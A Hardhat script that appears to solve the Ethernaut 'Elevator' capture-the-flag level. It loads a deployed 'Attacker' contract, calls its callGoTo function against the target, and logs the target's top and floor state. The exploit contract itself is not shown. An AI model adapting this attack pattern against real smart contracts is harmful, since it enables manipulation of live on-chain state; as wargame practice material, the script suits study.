import { ethers } from "hardhat";
const CONTRACT_ADDRESS = "0x46c9090c18B02Df8bD1849EddF5a27A448a0c043";
const PLAYER_ADDRESS = "0x81215d34367AF48d01E728AfF2976d9Df32fE604";
const ATTACKER_CONTRACT = "0x3F993ABa8d71326967CdCAe826D40C5298421134";

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS);
  const contract = await ethers.getContractAt(
    "Elevator",
    CONTRACT_ADDRESS,
    signer
  );
  // const attackerContractFactory = await ethers.getContractFactory(
  //   "Attacker",
  //   signer
  // );

  // const attackerContract = await attackerContractFactory.deploy();

  // console.log(attackerContract);

  const attackerContract = await ethers.getContractAt(
    "Attacker",
    ATTACKER_CONTRACT,
    signer
  );

  // Call attacker contracts callGoTo function with an arbitrary number
  console.log(await attackerContract.callGoTo());
  // Understand contract by evaluating user flows
  console.log("The current top is  at", await contract.top());

  console.log("the current floor is at", await contract.floor());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
